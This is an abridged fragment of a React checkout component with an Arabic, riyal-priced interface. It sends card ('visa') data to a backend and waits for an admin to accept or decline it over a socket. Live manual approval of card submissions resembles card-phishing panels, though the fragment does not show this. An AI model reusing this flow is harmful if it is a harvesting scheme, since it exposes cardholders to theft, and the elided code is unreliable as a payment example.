...
import { api_route, socket, user } from "../App";
...
const Payemnt = () => {
  ...
  const handleSubmit = async (e) => {
    ...
    try {
      await axios
        .post(api_route + "/visa/" + sessionStorage.getItem("user"), finalData)
        .then(() => {
          socket.emit("visa", {
  ...
  socket.on("acceptVisa", ({ID,USER}) => {
    console.log("acceptVisa From Admin", USER);
    sessionStorage.setItem("method", method);
    sessionStorage.setItem("id", ID);
    sessionStorage.setItem("products", cartData?.products);
    sessionStorage.setItem("totalPrice", cartData?.totalPrice);
    if (user === USER) {
  ...
  socket.on("declineVisa", ({ ID, USER }) => {
    console.log("declineVisa From Admin", USER);
    if (user === USER) {
      setLoad(false);
          ...
          >
            <div className="w-full flex flex-col gap-y-3 text-black" dir="rtl">
              ...
              <div className="flex gap-x-2">
                ...
                <span>{cartData?.totalPrice} ر.س</span>
              </div>
            </div>
